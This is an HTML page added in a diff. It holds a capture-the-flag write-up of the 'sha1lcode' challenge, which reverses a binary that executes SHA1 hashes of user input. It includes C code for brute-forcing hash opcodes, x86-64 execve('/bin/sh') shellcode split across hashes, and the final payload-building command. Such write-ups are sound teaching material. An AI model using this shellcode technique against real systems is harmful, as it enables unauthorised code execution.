@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+        <title>sha1lcode</title>
+        <meta charset="utf-8" />
+        <link href="http://krebsco.de/atom.xml" type="application/atom+xml" rel="alternate" title="Krebs CTF Writeups Full Atom Feed" />
+
+
+        <!-- Mobile viewport optimized: j.mp/bplateviewport -->
+        <meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1">
+
+        <link rel="stylesheet" type="text/css" href="./theme/gumby.css" />
+        <link rel="stylesheet" type="text/css" href="./theme/style.css" />
+        <link rel="stylesheet" type="text/css" href="./theme/pygment.css" />
+
+        <script src="./theme/js/libs/modernizr-2.6.2.min.js"></script>
+
+
+
+
+
+
+</head>
+
+<body id="index" class="home">
+
+
+    <div class="container">
+
+        <div class="row">
+
+          <header id="banner" class="body">
+                  <h1><a href="./">Krebs CTF Writeups <strong></strong></a></h1>
+          </header><!-- /#banner -->
+
+            <div id="navigation" class="navbar row">
+              <a href="#" gumby-trigger="#navigation &gt; ul" class="toggle"><i class="icon-menu"></i></a>
+             
+              <ul class="columns">
+                <li><a href="./">Home</a></li>
+
+                <li><a href="/writeups/atom.xml">RSS</a></li>
+                <li><a href="./pages/contact.html">Contact</a></li>
+
+              </ul>
+            </div>
+
+<section id="content" class="body">
+
+   <div class="row">
+        <div class="eleven columns">
+
+
+            <header>
+              <h2 class="entry-title">
+                <a href="./sha1lcode.html" rel="bookmark"
+                   title="Permalink to sha1lcode">sha1lcode</a></h2>
+           
+            </header>
+            <footer class="post-info">
+              <abbr class="published" title="2014-08-18T00:00:00">
+                Mon 18 August 2014
+              </abbr>
+              <address class="vcard author">By 
+                <a class="url fn" href="./author/samuirai.html"> samuirai</a>
+              </address>
+            </footer><!-- /.post-info -->
+            <div class="entry-content">
+              <ul>
+<li><strong>Solved by</strong>: samuirai</li>
+<li><strong>Writeup Author</strong>: samuirai</li>
+</ul>
+<p>The name of the challange <code>sha1lcode</code> already hints on the overall idea - writing shellcode that has something todo with sha1 hashes.</p>
+<p>So let's have a first look at the provided binary file:</p>
+<div class="highlight"><pre><span class="err">$</span> <span class="n">file</span> <span class="n">sha1lcode</span><span class="o">-</span><span class="mi">5</span><span class="n">b43cc13b0fb249726e0ae175dbef3fe</span>
+<span class="n">sha1lcode</span><span class="o">-</span><span class="mi">5</span><span class="n">b43cc13b0fb249726e0ae175dbef3fe</span><span class="o">:</span> <span class="n">ELF</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="n">LSB</span> <span class="n">executable</span><span class="p">,</span> <span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">,</span> <span class="n">version</span> <span class="mi">1</span> <span class="p">(</span><span class="n">SYSV</span><span class="p">),</span> <span class="n">dynamically</span> <span class="n">linked</span> <span class="p">(</span><span class="n">uses</span> <span class="n">shared</span> <span class="n">libs</span><span class="p">),</span> <span class="k">for</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">2.6.24</span><span class="p">,</span> <span class="n">not</span> <span class="n">stripped</span>
+</pre></div>
+
+
+<p>The following call tree image is generated with <code>Hopper Dissassembler.app</code>.</p>
+<p><img alt="sha1lcode calltree" src="data/sha1lcode/sha1_calltree.png" /></p>
+<p>Hopper can also generate some pseudo C code, which I have cleaned up a little bit and renamed variables:</p>
+<div class="highlight"><pre>    <span class="kd">function</span> <span class="nx">main</span> <span class="p">{</span>
+        <span class="nx">read</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">input_size</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">input_size</span> <span class="o">&gt;</span> <span class="mh">0x3e8</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">rax</span> <span class="o">=</span> <span class="nx">exit</span><span class="p">(</span><span class="mh">0x0</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="p">{</span>
+                <span class="nx">i</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+                <span class="k">while</span> <span class="p">(</span><span class="nx">input_size</span><span class="o">*</span><span class="mi">16</span> <span class="o">&gt;</span> <span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="nx">anz_chrs</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="nx">input_data</span><span class="o">+</span><span class="nx">i</span><span class="p">,</span> <span class="p">(</span><span class="nx">input_size</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="nx">i</span><span class="p">);</span>
+                        <span class="nx">i</span> <span class="o">=</span> <span class="nx">anz_chrs</span><span class="o">+</span><span class="nx">i</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="nx">j</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+                <span class="k">while</span> <span class="p">(</span><span class="nx">j</span> <span class="o">&lt;</span> <span class="nx">input_size</span><span class="p">)</span> <span class="p">{</span>
+                         <span class="nx">SHA1</span><span class="p">((</span><span class="nx">j</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="nx">input_data</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="p">(</span><span class="nx">j</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="nx">j</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nx">code</span><span class="p">);</span>
+                        <span class="nx">j</span> <span class="o">=</span> <span class="nx">j</span> <span class="o">+</span> <span class="mh">0x1</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="nx">memset</span><span class="p">(</span><span class="nx">input_data</span><span class="p">,</span> <span class="mh">0xffffffff</span><span class="p">,</span> <span class="mh">0x3e80</span><span class="p">);</span>
+                <span class="nx">rax</span> <span class="o">=</span> <span class="p">(</span><span class="nx">code</span><span class="p">)();</span>
+                <span class="k">return</span> <span class="mh">0x0</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="nx">rax</span><span class="p">;</span>
+    <span class="p">}</span>
+</pre></div>
+
+
+<p>At the start of the function you can see a <code>read()</code> of 4 bytes and a first check afterwards, which would exit the application
+if you enter 4 bytes bigger than 0x3e8.
+If this is check is passed, the entered value <code>input_size</code> is used in the while loop to <code>read()</code> more data into <code>input_data</code>.
+After this loop is completed, <code>input_data</code> is hashed in 16 byte chunks with <code>SHA1()</code> and written into <code>code</code>.
+At the end the original input_data is overwritten with <code>0xffffffff</code> and the program jumps to the <code>code</code> data.</p>
+<p>So the data we input in the loop, gets hashed in 16 byte chunks with SHA1 and then we jump to those hashes.
+Now it's clear what we have to do - we have to generate SHA1 hashes with valid x86-64 opcodes.</p>
+<p>This is a bit of crappy C code to bruteforce hashes with specific values.</p>
+<div class="highlight"><pre><span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="cp">#include &lt;string.h&gt;</span>
+<span class="cp">#include &lt;openssl/sha.h&gt;</span>
+
+<span class="kt">void</span> <span class="nf">gen_random</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="k">const</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">static</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">alphanum</span><span class="p">[]</span> <span class="o">=</span>
+        <span class="s">&quot;0123456789&quot;</span>
+        <span class="s">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>
+        <span class="s">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span><span class="p">;</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">alphanum</span><span class="p">[</span><span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">alphanum</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)];</span>
+    <span class="p">}</span>
+
+    <span class="n">s</span><span class="p">[</span><span class="n">len</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">max</span> <span class="o">=</span> <span class="mi">32</span><span class="p">;</span> <span class="c1">// generate max. 32 hashes with the searched values</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">ibuf</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">obuf</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+    <span class="k">for</span><span class="p">(;;)</span> <span class="p">{</span>
+        <span class="c1">// get a random string</span>
+        <span class="n">gen_random</span><span class="p">(</span><span class="n">ibuf</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
+
+        <span class="c1">// hash the random string</span>
+        <span class="n">SHA1</span><span class="p">(</span><span class="n">ibuf</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">obuf</span><span class="p">);</span>
+
+        <span class="cm">/*</span>
+<span class="cm">        check if we got a hash with the opcode(s) we want.</span>
+<span class="cm">        if(obuf[17]==0x48 &amp;&amp; obuf[18]==0x09 &amp;&amp; obuf[19]==0xcb ) {</span>
+<span class="cm">        if(obuf[18]==0xb1 &amp;&amp; obuf[19]==0x96 ) {</span>
+<span class="cm">        if(obuf[0]==0xeb &amp;&amp; obuf[1]==35 ) {</span>
+<span class="cm">        */</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">obuf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="mh">0x31</span> <span class="o">&amp;&amp;</span> <span class="n">obuf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">==</span><span class="mh">0xc0</span> <span class="p">)</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s sha1(&quot;</span><span class="p">,</span><span class="n">ibuf</span><span class="p">);</span>
+            <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">20</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%02x&quot;</span><span class="p">,</span> <span class="n">obuf</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+            <span class="p">}</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+            <span class="k">if</span><span class="p">(</span><span class="n">max</span><span class="o">--&lt;=</span><span class="mi">0</span><span class="p">)</span>
+            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>Now that we have a little tool to generate hashes with opcodes we have to come up with a general 
+idea to fit the shellcode into the hashes:</p>
+<p><img alt="sha1lcode opcodes" src="data/sha1lcode/sha1_opcodes.png" /></p>
+<p>The program jumps to the start of the first hash and there will be a jump to the <em>end</em> of the 2nd hash. At the end of the 2nd
+hash starts the shellcode with the first instruction(s). The beginning of the hash afterwards will be another jump the the end of the hash after that.</p>
+<p>So generally we have in the beginning of one hash a jump to the end of the next hash, which will contain one or more shellcode opcodes. This way we can execute anything we want...</p>
+<p>And this is the shellcode I used:</p>
+<div class="highlight"><pre><span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
+<span class="n">mov</span> <span class="n">rbx</span><span class="p">,</span> <span class="mh">0xFF978CD091969DD1</span>
+<span class="n">neg</span> <span class="n">rbx</span>
+<span class="n">push</span> <span class="n">rbx</span>
+<span class="p">;</span><span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rsp</span>
+<span class="n">push</span> <span class="n">rsp</span>
+<span class="n">pop</span> <span class="n">rdi</span>
+<span class="n">cdq</span>
+<span class="n">push</span> <span class="n">rdx</span>
+<span class="n">push</span> <span class="n">rdi</span>
+<span class="p">;</span><span class="n">mov</span> <span class="n">rsi</span><span class="p">,</span> <span class="n">rsp</span>
+<span class="n">push</span> <span class="n">rsp</span>
+<span class="n">pop</span> <span class="n">rsi</span>
+<span class="n">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3b</span>
+<span class="n">syscall</span>
+</pre></div>
+
+
+<p>The only problem is the length of the opcode. It was fairly fast to bruteforce up to three bytes.
+But I had to get the long string <code>/bin/sh</code> into the 64bit register and the 10 byte opcode is too
+long to bruteforce.</p>
+<div class="highlight"><pre><span class="mi">48</span><span class="n">BBD19D9691D08C97FF</span><span class="o">:</span> <span class="n">mov</span> <span class="n">rbx</span><span class="o">,</span> <span class="mh">0xff978cd091969dd1</span>
+</pre></div>
+
+
+<p>So I had to split this up in smaller opcodes:</p>
+<div class="highlight"><pre><span class="n">mov</span>   <span class="n">bl</span><span class="p">,</span> <span class="mh">0x97</span>
+<span class="n">mov</span>   <span class="n">bh</span><span class="p">,</span> <span class="mh">0xff</span>
+<span class="n">shl</span>  <span class="n">ebx</span><span class="p">,</span> <span class="mh">0x10</span>
+<span class="n">mov</span>   <span class="n">bh</span><span class="p">,</span> <span class="mh">0x8c</span>
+<span class="n">mov</span>   <span class="n">bl</span><span class="p">,</span> <span class="mh">0xd0</span>
+<span class="n">shl</span>  <span class="n">rbx</span><span class="p">,</span> <span class="mh">0x20</span>
+<span class="n">mov</span>   <span class="n">ch</span><span class="p">,</span> <span class="mh">0x91</span>
+<span class="n">mov</span>   <span class="n">cl</span><span class="p">,</span> <span class="mh">0x96</span>
+<span class="n">shl</span>  <span class="n">ecx</span><span class="p">,</span> <span class="mh">0x10</span>
+<span class="n">mov</span>   <span class="n">cl</span><span class="p">,</span> <span class="mh">0xd1</span>
+<span class="n">mov</span>   <span class="n">ch</span><span class="p">,</span> <span class="mh">0x9d</span>
+</pre></div>
+
+
+<p>Which is almost perfect, but the <code>shl</code> in <code>rbx</code> still need 4 bytes:</p>
+<div class="highlight"><pre><span class="mi">48</span><span class="n">C1E310</span><span class="o">:</span> <span class="n">shl</span> <span class="n">rbx</span><span class="o">,</span> <span class="mh">0x10</span>
+</pre></div>
+
+
+<p>But because 3 bytes can be bruteforced easily and the <code>jmp</code> only needs 2 bytes, we can
+bruteforce 3 bytes at the end of the one hash, and 3 bytes at the beginning fo the next hash to match
+<code>opcode (4 bytes) + jump (2 bytes) = 6 bytes</code></p>
+<p>In the end we can split up the shellcode like this:</p>
+<div class="highlight"><pre>  <span class="s-Atom">original</span> <span class="s-Atom">text</span>         <span class="s-Atom">opcode</span> <span class="s-Atom">in</span> <span class="s-Atom">the</span> <span class="s-Atom">sha1</span> <span class="s-Atom">hash</span>
+<span class="s-Atom">-----------------:------------------------------------</span>
+<span class="s-Atom">ikLEsXBe58oJIuFL</span> <span class="s-Atom">:</span> <span class="p">(</span><span class="s-Atom">start</span><span class="p">)</span> <span class="s-Atom">jmp</span> <span class="m">2</span>
+<span class="nv">CYOEsiM5zOvynLcZ</span> <span class="s-Atom">:</span>   <span class="p">(</span><span class="s-Atom">end</span><span class="p">)</span> <span class="s-Atom">xor</span> <span class="s-Atom">eax</span><span class="p">,</span> <span class="s-Atom">eax</span>
+<span class="nv">EI6Tlq7y76Vh5hyN</span> <span class="s-Atom">:</span> <span class="p">(</span><span class="s-Atom">start</span><span class="p">)</span> <span class="s-Atom">jmp</span> <span class="m">2</span>
+<span class="nv">S61SFzdOBn3zyrBf</span> <span class="s-Atom">:</span>   <span class="p">(</span><span class="s-Atom">end</span><span class="p">)</span> <span class="s-Atom">mov</span> <span class="s-Atom">bl</span><span class="p">,</span> <span class="m">0</span><span class="s-Atom">x97</span>
+<span class="nv">EI6Tlq7y76Vh5hyN</span> <span class="s-Atom">:</span> <span class="p">(</span><span class="s-Atom">start</span><span class="p">)</span> <span class="s-Atom">jmp</span> <span class="m">2</span>
+<span class="s-Atom">zihgN1OfifVotOPs</span> <span class="s-Atom">:</span>   <span class="p">(</span><span class="s-Atom">end</span><span class="p">)</span> <span class="s-Atom">mov</span> <span class="s-Atom">bh</span><span class="p">,</span> <span class="m">0</span><span class="s-Atom">xff</span>
+<span class="s-Atom">qzg3NxCyYGweMVIr</span> <span class="s-Atom">:</span> <span class="p">(</span><span class="s-Atom">start</span><span class="p">)</span> <span class="s-Atom">jmp</span> <span class="m">3</span>
+<span class="s-Atom">czbdI1dngWv4nbYv</span> <span class="s-Atom">:</span>   <span class="p">(</span><span class="s-Atom">end</span><span class="p">)</span> <span class="s-Atom">shl</span> <span class="nv">EBX</span>
+<span class="nv">EI6Tlq7y76Vh5hyN</span> <span class="s-Atom">:</span> <span class="p">(</span><span class="s-Atom">start</span><span class="p">)</span> <span class="s-Atom">jmp</span> <span class="m">2</span>
+<span class="nv">UqZhIrIoQrZu29qM</span> <span class="s-Atom">:</span>   <span class="p">(</span><span class="s-Atom">end</span><span class="p">)</span> <span class="s-Atom">mov</span> <span class="s-Atom">bh</span>
+<span class="nv">EI6Tlq7y76Vh5hyN</span> <span class="s-Atom">:</span> <span class="p">(</span><span class="s-Atom">start</span><span class="p">)</span> <span class="s-Atom">jmp</span> <span class="m">2</span>
+<span class="s-Atom">gMq4RKcD34SOoMpk</span> <span class="s-Atom">:</span>   <span class="p">(</span><span class="s-Atom">end</span><span class="p">)</span> <span class="s-Atom">mov</span> <span class="s-Atom">bl</span>
+<span class="s-Atom">qzg3NxCyYGweMVIr</span> <span class="s-Atom">:</span> <span class="p">(</span><span class="s-Atom">start</span><span class="p">)</span> <span class="s-Atom">jmp</span> <span class="m">3</span>
+<span class="s-Atom">j90mqufCQHUY7DFI</span> <span class="s-Atom">:</span>   <span class="p">(</span><span class="s-Atom">end</span><span class="p">)</span> <span class="s-Atom">part</span> <span class="s-Atom">shl</span>
+<span class="nv">BkrI3NqemVnl6iq2</span> <span class="s-Atom">:</span> <span class="p">(</span><span class="s-Atom">start</span><span class="p">)</span> <span class="s-Atom">part</span> <span class="s-Atom">shl</span> <span class="s-Atom">and</span> <span class="s-Atom">jmp</span> <span class="m">2</span>
+<span class="s-Atom">l05Y1tnrwjQGa9GB</span> <span class="s-Atom">:</span>   <span class="p">(</span><span class="s-Atom">end</span><span class="p">)</span> <span class="s-Atom">mov</span> <span class="s-Atom">ch</span><span class="p">,</span> <span class="m">0</span><span class="s-Atom">x91</span>
+<span class="nv">EI6Tlq7y76Vh5hyN</span> <span class="s-Atom">:</span> <span class="p">(</span><span class="s-Atom">start</span><span class="p">)</span> <span class="s-Atom">jmp</span> <span class="m">2</span>
+<span class="s-Atom">mqKoGcLyK8fi3kSH</span> <span class="s-Atom">:</span>   <span class="p">(</span><span class="s-Atom">end</span><span class="p">)</span> <span class="s-Atom">mov</span> <span class="s-Atom">cl</span><span class="p">,</span> <span class="m">0</span><span class="s-Atom">x96</span>
+<span class="s-Atom">qzg3NxCyYGweMVIr</span> <span class="s-Atom">:</span> <span class="p">(</span><span class="s-Atom">start</span><span class="p">)</span> <span class="s-Atom">jmp</span> <span class="m">3</span>
+<span class="s-Atom">hVoED3xi4I5kTghS</span> <span class="s-Atom">:</span>   <span class="p">(</span><span class="s-Atom">end</span><span class="p">)</span> <span class="s-Atom">shl</span> <span class="nv">ECX</span>
+<span class="nv">EI6Tlq7y76Vh5hyN</span> <span class="s-Atom">:</span> <span class="p">(</span><span class="s-Atom">start</span><span class="p">)</span> <span class="s-Atom">jmp</span> <span class="m">2</span>
+<span class="m">70</span><span class="s-Atom">hQz3yujDwrWyEi</span> <span class="s-Atom">:</span>   <span class="p">(</span><span class="s-Atom">end</span><span class="p">)</span> <span class="s-Atom">mov</span> <span class="s-Atom">cl</span><span class="p">,</span> <span class="m">0</span><span class="s-Atom">xd1</span>
+<span class="nv">EI6Tlq7y76Vh5hyN</span> <span class="s-Atom">:</span> <span class="p">(</span><span class="s-Atom">start</span><span class="p">)</span> <span class="s-Atom">jmp</span> <span class="m">2</span>
+<span class="nv">JcGdue7SlbVZ2lpg</span> <span class="s-Atom">:</span>   <span class="p">(</span><span class="s-Atom">end</span><span class="p">)</span> <span class="s-Atom">mov</span> <span class="s-Atom">ch</span><span class="p">,</span> <span class="m">0</span><span class="s-Atom">x9d</span>
+<span class="s-Atom">qzg3NxCyYGweMVIr</span> <span class="s-Atom">:</span> <span class="p">(</span><span class="s-Atom">start</span><span class="p">)</span> <span class="s-Atom">jmp</span> <span class="m">3</span>
+<span class="nv">XJodA3GFNyfC5mp1</span> <span class="s-Atom">:</span>   <span class="p">(</span><span class="s-Atom">end</span><span class="p">)</span> <span class="s-Atom">or</span> <span class="s-Atom">rbx</span><span class="p">,</span> <span class="s-Atom">rcx</span>
+<span class="s-Atom">qzg3NxCyYGweMVIr</span> <span class="s-Atom">:</span> <span class="p">(</span><span class="s-Atom">start</span><span class="p">)</span> <span class="s-Atom">jmp</span> <span class="m">3</span>
+<span class="nv">CzoXGfRlsiDKfS4H</span> <span class="s-Atom">:</span>   <span class="p">(</span><span class="s-Atom">end</span><span class="p">)</span> <span class="s-Atom">neg</span> <span class="s-Atom">rbx</span>
+<span class="s-Atom">qzg3NxCyYGweMVIr</span> <span class="s-Atom">:</span> <span class="p">(</span><span class="s-Atom">start</span><span class="p">)</span> <span class="s-Atom">jmp</span> <span class="m">3</span>
+<span class="s-Atom">fgnxUdbfK3yemOIH</span> <span class="s-Atom">:</span>   <span class="p">(</span><span class="s-Atom">end</span><span class="p">)</span> <span class="s-Atom">push</span> <span class="s-Atom">rbx</span><span class="p">,</span> <span class="s-Atom">push</span> <span class="s-Atom">rsp</span><span class="p">,</span> <span class="s-Atom">pop</span> <span class="s-Atom">rdi</span>
+<span class="s-Atom">qzg3NxCyYGweMVIr</span> <span class="s-Atom">:</span> <span class="p">(</span><span class="s-Atom">start</span><span class="p">)</span> <span class="s-Atom">jmp</span> <span class="m">3</span>
+<span class="s-Atom">taglR8DRWWJmg8Ss</span> <span class="s-Atom">:</span>   <span class="p">(</span><span class="s-Atom">end</span><span class="p">)</span> <span class="s-Atom">cdq</span><span class="p">,</span> <span class="s-Atom">push</span> <span class="s-Atom">rdx</span><span class="p">,</span> <span class="s-Atom">push</span> <span class="s-Atom">rdi</span>
+<span class="nv">EI6Tlq7y76Vh5hyN</span> <span class="s-Atom">:</span> <span class="p">(</span><span class="s-Atom">start</span><span class="p">)</span> <span class="s-Atom">jmp</span> <span class="m">2</span>
+<span class="s-Atom">ygX8lQIoZ4Ln5EjX</span> <span class="s-Atom">:</span>   <span class="p">(</span><span class="s-Atom">end</span><span class="p">)</span> <span class="s-Atom">push</span> <span class="s-Atom">rsp</span><span class="p">,</span> <span class="s-Atom">pop</span> <span class="s-Atom">rsi</span>
+<span class="nv">EI6Tlq7y76Vh5hyN</span> <span class="s-Atom">:</span> <span class="p">(</span><span class="s-Atom">start</span><span class="p">)</span> <span class="s-Atom">jmp</span> <span class="m">2</span>
+<span class="m">9</span><span class="s-Atom">tyObcwpkagTLtEh</span> <span class="s-Atom">:</span>   <span class="p">(</span><span class="s-Atom">end</span><span class="p">)</span> <span class="s-Atom">mov</span> <span class="s-Atom">al</span><span class="p">,</span> <span class="m">0</span><span class="s-Atom">x3b</span>
+<span class="nv">EI6Tlq7y76Vh5hyN</span> <span class="s-Atom">:</span> <span class="p">(</span><span class="s-Atom">start</span><span class="p">)</span> <span class="s-Atom">jmp</span> <span class="m">2</span>
+<span class="nv">JtZj2STVLXTitmQD</span> <span class="s-Atom">:</span>   <span class="p">(</span><span class="s-Atom">end</span><span class="p">)</span> <span class="s-Atom">syscall</span>
+</pre></div>
+
+
+<p>The number behind <code>jmp 2/3</code> means if it will jump to 2 or 3 bytes before the end of the next hash. Because jumps are done relatively and not absolute it is always the same hash. <code>qzg3NxCyYGweMVIr == jump to the last 3 bytes of the next hash</code> and <code>EI6Tlq7y76Vh5hyN == jump to the last 2 bytes of the next hash</code>.</p>
+<p>Now we can put the full string together, with <code>\x3a\x00\x00\x00</code> as prefix to pass the first check, followed by the 16 byte chunks for the sha1 hashes:</p>
+<div class="highlight"><pre><span class="n">echo</span> <span class="s">&quot;</span><span class="se">\x3a\x00\x00\x00</span><span class="s">ikLEsXBe58oJIuFLCYOEsiM5zOvynLcZEI6Tlq7y76Vh5hyNS61SFzdOBn3zyrBfEI6Tlq7y76Vh5hyNzihgN1OfifVotOPsqzg3NxCyYGweMVIrczbdI1dngWv4nbYvEI6Tlq7y76Vh5hyNUqZhIrIoQrZu29qMEI6Tlq7y76Vh5hyNgMq4RKcD34SOoMpkqzg3NxCyYGweMVIrj90mqufCQHUY7DFIBkrI3NqemVnl6iq2l05Y1tnrwjQGa9GBEI6Tlq7y76Vh5hyNmqKoGcLyK8fi3kSHqzg3NxCyYGweMVIrhVoED3xi4I5kTghSEI6Tlq7y76Vh5hyN70hQz3yujDwrWyEiEI6Tlq7y76Vh5hyNJcGdue7SlbVZ2lpgqzg3NxCyYGweMVIrXJodA3GFNyfC5mp1qzg3NxCyYGweMVIrCzoXGfRlsiDKfS4Hqzg3NxCyYGweMVIrfgnxUdbfK3yemOIHqzg3NxCyYGweMVIrtaglR8DRWWJmg8SsEI6Tlq7y76Vh5hyNygX8lQIoZ4Ln5EjXEI6Tlq7y76Vh5hyN9tyObcwpkagTLtEhEI6Tlq7y76Vh5hyNJtZj2STVLXTitmQD`python -c &#39;print </span><span class="se">\&quot;</span><span class="s">A</span><span class="se">\&quot;</span><span class="s">*0x3e8&#39;`&quot;</span> <span class="o">&gt;</span> <span class="n">asd</span>
+</pre></div>
+            </div><!-- /.entry-content -->
+
+
+        </div><!-- /.eleven.columns -->
+        
+<div class="three columns">
+
+<h4>Pages</h4>
+
+ <ul>
+      <li><a href="/writeups/atom.xml">RSS</a></li>
+      <li><a href="./pages/contact.html">Contact</a></li>
+  </ul>
+
+<!--<h4>Categories</h4>
+<ul>
+		<li><a href="./category/posts.html">posts</a></li>
+</ul>
+-->
+
+<h4>Tags</h4>
+	<ul>
+	    <li class="tag-2"><a href="./tag/captcha.html">captcha</a></li>
+	    <li class="tag-0"><a href="./tag/pwnium2014.html">pwnium2014</a></li>
+	    <li class="tag-4"><a href="./tag/hitconctf2014.html">hitconctf2014</a></li>
+	    <li class="tag-4"><a href="./tag/2048.html">2048</a></li>
+	    <li class="tag-4"><a href="./tag/post-mortem.html">post-mortem</a></li>
+	    <li class="tag-1"><a href="./tag/crackme.html">crackme</a></li>
+	    <li class="tag-4"><a href="./tag/sha1lcode.html">sha1lcode</a></li>
+</ul>
+
+
+<nav class="widget">
+  <h4>Social</h4>
+  <ul>
+    <li><a href="http://twitter.com/krebsbob">@krebsbob</a></li>
+    <li><a href="irc://irc.freenode.net#krebs">irc.freenode.net#krebs</a></li>
+  </ul>
+</nav>
+
+</div> </div><!-- /.row -->
+
+
+</section>
+
+       </div><!-- /.row -->
+    </div><!-- /.container -->
+
+
+       <div class="container.nopad bg">
+
+    
+        <footer id="credits" class="row">
+          <div class="seven columns left-center">
+
+                   <address id="about" class="vcard body">
+                    Proudly powered by <a href="http://getpelican.com/">Pelican</a>,
+                    which takes great advantage of <a href="http://python.org">Python</a>.
+                    <br />
+                    Based on the <a target="_blank" href="http://gumbyframework.com">Gumby Framework</a>
+                    </address>
+          </div>
+
+
+          <div class="seven columns">
+            <div class="row">
+              <ul class="socbtns">
+
+
+
+
+
+              </ul>
+            </div>
+          </div>
+        </footer>
+
+    </div>
+
+
+  <script src="./theme/js/libs/jquery-1.9.1.min.js"></script>
+  <script src="./theme/js/libs/gumby.min.js"></script>
+  <script src="./theme/js/plugins.js"></script>
+</body>
+</html>
